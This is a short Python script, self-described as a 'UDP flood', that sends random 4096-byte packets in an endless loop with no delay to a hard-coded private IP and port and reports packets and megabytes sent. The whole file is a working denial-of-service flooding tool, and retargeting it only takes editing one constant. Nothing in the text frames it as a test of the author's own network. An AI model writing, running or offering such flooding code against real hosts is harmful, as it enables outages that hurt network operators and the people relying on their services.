import socket
import time
import os

TARGET_IP = "192.168.0.69"  # Broadcast or specific IP
TARGET_PORT = 9999
PACKET_SIZE = 4096  # Bytes per packet
DELAY = 0  # Seconds between packets (set to e.g. 0.001 to limit slightly)

print(f"🚀 Starting UDP flood to {TARGET_IP}:{TARGET_PORT} with {PACKET_SIZE} byte packets...")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

payload = os.urandom(PACKET_SIZE)

packet_count = 0
start = time.time()

try:
    while True:
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        packet_count += 1

        if packet_count % 1000 == 0:
            elapsed = time.time() - start
            mb_sent = (PACKET_SIZE * packet_count) / (1024 * 1024)
            print(f"📦 Sent {packet_count} packets ≈ {mb_sent:.2f} MB in {elapsed:.1f}s ({mb_sent/elapsed:.2f} MB/s)")

        if DELAY > 0:
            time.sleep(DELAY)

except KeyboardInterrupt:
    print("⛔️ Stopped by user")
    sock.close()
